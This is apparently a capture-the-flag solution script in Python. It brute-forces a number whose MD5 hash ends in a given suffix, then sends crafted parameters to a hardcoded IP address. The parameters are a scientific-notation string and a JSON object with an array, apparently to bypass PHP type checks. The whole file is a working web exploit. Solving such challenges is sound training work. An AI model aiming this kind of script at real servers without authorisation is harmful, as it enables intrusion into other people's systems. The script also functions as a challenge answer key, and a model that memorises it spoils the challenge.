import requests
import hashlib

url = "http://61.147.171.105:57481"

for i in range(100000):
    b=i.to_bytes(22,'big')
    m=hashlib.md5(str(i).encode()).hexdigest()
    if(m[-6:]=="8b184b"):
        b = i
        break


params = {
    "a":"1e9",
    "b":b,
    "c":'{"m":"2023a","n":[[],0]}'
}

response = requests.get(url,params=params)

if response.status_code == 200:
    print("请求成功！")
    print("响应内容",response.text)

else:
    print("请求失败！状态码:",response.status_code)
